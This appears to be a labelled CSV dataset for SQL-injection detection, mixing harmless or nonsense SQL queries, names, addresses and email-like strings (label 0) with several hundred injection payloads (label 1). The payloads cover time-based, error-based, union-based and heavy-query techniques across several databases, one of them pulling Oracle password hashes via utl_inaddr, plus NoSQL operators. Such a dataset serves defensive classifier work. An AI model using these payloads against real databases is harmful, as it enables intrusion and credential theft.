Query,Label
"1 ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 9325 = 9325",1
28%,1
SELECT AVG ( thirty ) FROM eventually SELECT SUM ( special ),0
"SELECT * FROM consonant WHERE curve IN ( 'us', 'sign', 'refer' )",0
"-4317"" ) ) as nxvn where 2566 = 2566 union all select 2566,2566,2566#",1
"1"" ) where 4588 = 4588",1
"c/ pablo iglesias, 116",0
"SELECT * FROM folks ORDER BY prize, clothing",0
masmitj,0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1
"SELECT REPEAT ( CustomerName, 2 ) FROM Customers;",0
"1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1
"1%"" ) and make_set ( 8403 = 8403,8899 ) and ( ""%"" = """,1
shrum@uniovivirtual.nz,0
cosme,0
"iif ( 7011 = 2522,1,1/0 )",1
"1%' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",1
1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",1
1 where 7882 = 7882,1
SELECT AVG ( poor ) FROM library,0
SELECT * FROM continent WHERE before IN ( SELECT struck FROM name ),0
SELECT COUNT ( instead ) FROM down,0
SELECT AVG ( letter ) FROM dull SELECT SUM ( service ),0
lavat@ajuntamentbarcelona20.gy,0
if ( 3831 = 9321 ) select 3831 else drop function ybru--,1
"SELECT chapter,die,seat,can,proper ( ( gun JOIN night ON higher.needle = wall.yourself ) INNER JOIN freeON Orders.community = rear.driverID )",0
"1%"" ) ) ) union all select null,null--",1
marsh@comerciosaspe.ke,0
maragliano serna,0
"SELECT MICROSECOND ( ""23:59:59.000045"" ) ;",0
"1' in boolean mode ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",1
SELECT COUNT ( DISTINCT equator ) FROM manufacturing,0
priaranza del bierzo,0
"-5131' ) ) ) union all select 4854,4854,4854,4854,4854,4854,4854#",1
SELECT clock ( s ) FROM nearly,0
1'|| ( select 'qstz' where 6835 = 6835,1
calle capitan palacios 71,0
"1 where 7906 = 7906 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"-2149"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""hoon"" like ""hoon",1
SELECT * FROM public WHERE hung = 'return' OR had = 'oldest',0
SELECT * FROM screen WHERE thank = 'across' FETCH FIRST 3 ROWS ONLY,0
hi or a = a,1
ciudad real,0
"1' in boolean mode ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
value'/**/OR/**/1=1--,1
SELECT independent ( s ) FROM go INNER JOIN,0
1' ) ) as bbdf where 1327 = 1327,1
vilagut victori,0
1' ) ) ) and sleep ( 5 ) and ( ( ( 'lbmp' = 'lbmp,1
SELECT TOP 3 * FROM heading WHERE character = 'prepare' SELECT * FROM warm,0
1' ) ) as cjjm where 1981 = 1981,1
-8112' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'xopg' = 'xopg,1
SELECT * FROM only WHERE NOT acres = 'whale',0
1' ) where 3730 = 3730 and sleep ( 5 ) #,1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1
fickes,0
select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
SELECT DISTINCT command FROM gradually,0
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three,0
"-1351"" where 6968 = 6968 or 5684 = 8582",1
"SELECT cattle, post, sidesFROM breathing WHERE tropical IS NOT NULL",0
"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'uwrm' = 'uwrm",1
cea,0
-8233' or 9538 = 1882#,1
alobras,0
olrich-shapiro1@nuriamartin.aw,0
37576555y,0
SELECT TOP 50 PERCENT * FROM thy,0
"c/ de puigcerda s/n, 1-g",0
"-1748%"" ) ) ) union all select 2987#",1
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) # mafe",1
"1"" ) ) as phis where 4420 = 4420 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM essential,0
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'dgvg' = 'dgvg,1
SELECT COUNT ( birthID ) FROM rise,0
bateman@alojesuweb.in,0
"1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
SELECT * FROM clothes WHERE parent = 'direction' AND ( pencil = 'heavy' OR matter = 'parts' ),0
uriz carmona,0
SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY,0
"1 where 9869 = 9869 union all select null,null#",1
"SELECT measure, they+ ', ' + declared+ ' ' + repeat+ ', ' + entire AS catch FROM hospital",0
2354,0
"calle espio, 120, 11?a",0
SELECT * FROM cast WHERE aside BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT * FROM hospital WHERE girl IN ( 'however', 'most', 'milk' )",0
barrenechea sadurn,0
"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",1
-1643' where 1968 = 1968 or 3484 = 6642,1
1 where 9393 = 9393 waitfor delay '0:0:5'--,1
1 ) as phja where 4627 = 4627,1
SELECT buy ( s ) FROM call UNION,0
"calle perez galdos 193,",0
"SELECT YEAR ( ""2017-06-15 09:34:21"" ) ;",0
"c/ encajeras, 40 4?f",0
"1' ) as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",1
"1' where 6902 = 6902 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",1
SELECT * FROM recognize WHERE sure NOT LIKE '[court]%',0
cabot@eurograb.tel,0
"-5182"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1",1
select ( case when ( 3435 = 4011 ) then 1 else 3435* ( select 3435 from master..sysdatabases ) end ) --,1
"1"" ) as drrx where 8633 = 8633 union all select null,null,null--",1
SELECT greatly ( s ) FROM gas,0
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
"SELECT Orders.allowrID, Employees.increase, Employees.star FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.lackID ORDER BY Orders.animalID",0
"1"" ) ) as gawq where 4728 = 4728 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"-4736' ) ) or elt ( 5835 = 5509,5509 ) and ( ( 'iawg' = 'iawg",1
levi@coivoco.gr,0
okura4,0
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
"-9837"" where 7201 = 7201 union all select 7201,7201,7201--",1
4s2cu8e44,0
2651,0
"-8200' in boolean mode ) union all select 3360,3360--",1
"1"" ) as kzuq where 4259 = 4259",1
SELECT TOP 3 * FROM hall WHERE difficulty = 'outer',0
"1' in boolean mode ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"{""$regex"": "".*""}",1
"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT REPLACE ( ""SQL Tutorial"", ""SQL"", ""HTML"" ) ;",0
1%' ) waitfor delay '0:0:5'--,1
SELECT * FROM loose WHERE depth = 'attention' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( office ) FROM among,0
"1%"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
"SELECT adventure AS soon, facing AS [apple] FROM choose",0
"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1
-9841 where 4612 = 4612 union all select 4612--,1
"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
"1' where 1031 = 1031 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT AVG ( thin ) FROM force SELECT SUM ( money ),0
SELECT TOP 3 * FROM split,0
"SELECT * FROM west WHERE wide BETWEEN ""information"" AND ""stomach""",0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%"" = """,1
"SELECT signID AS ID, grain AS throat FROM riding",0
"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'fnon' like 'fnon",1
SELECT * FROM highest WHERE loose = 'still' FETCH FIRST 3 ROWS ONLY,0
"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",1
SELECT * FROM future FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM limited WHERE oil BETWEEN '1996-07-01' AND '1996-07-31',0
"1%"" ) union all select null,null,null,null,null,null,null#",1
"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT observe FROM yet UNION ALL SELECT change FROM band ORDER BY voyage,0
SELECT * FROM electricity FETCH FIRST 3 ROWS ONLY,0
cangrenarse,0
"-9209%"" ) ) ) union all select 3736,3736,3736--",1
"-6970"" ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""dyrq"" like ""dyrq",1
remberta,0
SELECT drawn ( s ) FROM closer INNER JOIN,0
SELECT * FROM actually WHERE movie = 'paint',0
SELECT * FROM nest WHERE NOT burst = 'source',0
SELECT * FROM underline FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pain,0
guadalcanal,0
SELECT last ( s ) FROM bank UNION ALL,0
"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""ccfn",1
#NAME?,1
"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'ojag' = 'ojag",1
"1"" ) ) ) union all select null#",1
SELECT COUNT ( wherever ) FROM plus,0
1' ) where 6045 = 6045,1
SELECT * FROM done WHERE explore = 'shine' LIMIT 3,0
"1' in boolean mode ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 6872--",1
SELECT COUNT ( value ) FROM tea,0
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM certain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM system,0
1'|| ( select 'aevx' from dual where 9999 = 9999,1
"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""otgh"" like ""otgh",1
"SELECT brave,package,these,raw,result ( ( large JOIN also ON way.collect = wall.difficult ) INNER JOIN proudON Orders.farm = pipe.certainlyID )",0
"1%"" ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""%"" = """,1
SELECT AVG ( too ) FROM buffalo,0
02ap36o5473,0
"SELECT * FROM wrapped ORDER BY slipped ASC, highest DESC",0
corrales de duero,0
SELECT * FROM smooth WHERE lungs = 'gone',0
SELECT * FROM arrange WHERE NOT surprise = 'company',0
SELECT very ( s ) FROM dark LEFT JOIN,0
"SELECT ride,protection,beauty,horn,native ( ( finger JOIN bad ON play.review = paper.hit ) INNER JOIN spokenON Orders.income = instant.appliedID )",0
"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
"carlos trivio moreno, 2,",0
SELECT * FROM opposite ORDER BY rope DESC,0
"1' ) as wnyl where 8978 = 8978 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-2717"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"-2365 ) ) union all select 8190,8190#",1
palera,0
"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ngnd"" like ""ngnd",1
espls,0
1'|| ( select 'vpuh' where 8164 = 8164,1
digott_sims@enigmatico.ar,0
5212,0
"-3017"" ) ) as ljit where 9128 = 9128 union all select 9128,9128,9128,9128,9128--",1
"-6942' ) union all select 7280,7280,7280#",1
"1"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"moneyba, 114",0
"1%"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,1
"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl",1
"1'+ ( select lhho where 7579 = 7579 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"1 ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 3023 = 3023",1
"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",1
SELECT YEAR ( CURDATE ( ) ) ;,0
1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,1
SELECT * FROM sign WHERE dance BETWEEN 10 AND 20,0
"1' ) ) as mdtm where 1393 = 1393 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT * FROM below WHERE fill NOT LIKE 'situation%',0
"SELECT you,dance,welcome,leg,children ( ( ball JOIN ahead ON account.birth = driving.visit ) INNER JOIN disappearON Orders.sick = eight.purposeID )",0
1%' order by 1#,1
waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl,1
navalmoral de bjar,0
newlinsky@forohh.et,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""kndm"" = ""kndm",1
nicolalde llovet,0
"{""$where"": ""this.username == this.password""}",1
SELECT AVG ( plenty ) FROM serious SELECT SUM ( suggest ),0
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # rhli",1
lenya@fbi-criminal-network.com.mil,0
SELECT * FROM third WHERE NOT habit = 'design',0
8629,0
SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch,0
-6567' ) ) union all select 3217#,1
"-8506' ) ) ) union all select 1950,1950,1950,1950,1950,1950--",1
"INSERT INTO lying ( border, vast, tune ) VALUES ( 'longer', 'movement', 'dirt' )",0
SELECT COUNT ( those ) FROM provide,0
43877,0
0orru6t5,0
lauriaul,0
SELECT COUNT ( memory ) FROM organization,0
SELECT AVG ( Price ) FROM check,0
"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
1 where 3956 = 3956,1
42141,0
"1' in boolean mode ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) #",1
begin user_lock.sleep ( 5 ),1
1' ) as rhvm where 1420 = 1420,1
FROM ( SELECT DISTINCT simply FROM fish ),0
SELECT * FROM bottom ORDER BY thou,0
2.45E+15,0
"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'tvar' = 'tvar",1
-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm' like 'agcm,1
escarpelo,0
"marines, los",0
warwicke@discon.mm,0
"1 ) where 9059 = 9059 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1
"SELECT sold,fully FROM sugar WHERE figure = 'symbol' UNION SELECT garage, had FROM carbon",0
"1"" ) where 4426 = 4426 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"-7491"" ) as cnrn where 3635 = 3635 order by 1#",1
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY,0
2.45746E+15,0
"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1
SELECT boy ( s ) FROM card SELECT carry ( s ),0
30034324g,0
navarredonda de la rinconada,0
1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,1
"1%"" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
SELECT copper ( s ) FROM day SELECT layers FROM success,0
5.72741E+15,0
"1"" ) ) as ccjk where 1932 = 1932 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
benabarre,0
SELECT COUNT ( DISTINCT park ) FROM someone,0
1' ) ) as stnn where 6160 = 6160 and 8881 = 7347--,1
4ibari8a,0
40529,0
"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
3.12801E+15,0
SELECT * FROM table WHERE knife BETWEEN speech09/01/1996party AND eager15/31/1996cow,0
"SELECT Employees.herd, COUNT ( Orders.earlyID ) AS stoppedFROM ( OrdersINNER JOIN symbol ON Orders.cornerID = Employees.spreadID )",0
exec sp,1
"SELECT taughtID AS ID, discovery AS steady FROM mainly",0
SELECT TOP 3 * FROM people WHERE sheep = 'tube' SELECT * FROM enemy,0
-7758%' ) ) ) or 3038 = 3038,1
"SELECT * FROM baby WHERE our IN ( 'grown', 'single', 'examine' )",0
select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --,1
gelis,0
"1"" and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )",1
guasca,0
SELECT * FROM dog 3 SELECT * FROM gave,0
-4313%' ) or 6872 = 6872 and ( '%' = ',1
"-2125"" ) ) or 8571 = 8571--",1
1' ) and 7533 = 7533 and ( 'dbjq' = 'dbjq,1
SELECT edge ( s ) FROM tree FULL OUTER JOIN,0
1'|| ( select 'allj' where 7334 = 7334,1
"INSERT INTO feature ( solar, likely, quietly ) VALUES ( 'shot', 'rest', 'floor' )",0
"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1
"SELECT lovely, section, not FROM thou WHERE amount IS NULL",0
"-6746"" ) or ( 8459 = 8459 ) *4906 and ( ""kohi"" like ""kohi",1
SELECT * FROM corn WHERE where = 'alive' OR cow = 'at',0
valeika@italianmotorvillagesevilla.gd,0
"1 ) as hlit where 4973 = 4973 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
-9434' ) union all select 3106#,1
SELECT * FROM society WHERE train BETWEEN 10 AND 20,0
"SELECT Orders.sortrID, Employees.left, Employees.hurry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.postID ORDER BY Orders.taughtID",0
SELECT * FROM rush WHERE car = 'cowboy' FETCH FIRST 3 ROWS ONLY,0
-8378%' ) union all select 5491#,1
"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",1
SELECT * FROM this ORDER BY article DESC,0
ruano barril,0
"1"" where 2878 = 2878 union all select null,null,null,null,null#",1
1' ) ) as dago where 9788 = 9788,1
8.2886E+15,0
"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1
shupe,0
"1"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""prhp"" = ""prhp",1
"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""duuw"" = ""duuw",1
"1%' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",1
SELECT * FROM bend WHERE own NOT LIKE '[needle]%',0
FROM ( SELECT DISTINCT rhyme FROM cake ),0
"1 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT get ( s ) FROM smoke UNION,0
"1"" where 5517 = 5517 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
